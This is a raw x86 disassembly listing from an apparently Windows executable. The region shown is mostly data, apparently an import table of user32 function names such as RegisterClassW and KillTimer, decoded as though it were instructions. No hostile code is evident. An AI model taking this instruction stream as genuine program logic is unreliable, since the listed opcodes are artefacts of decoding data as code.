  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
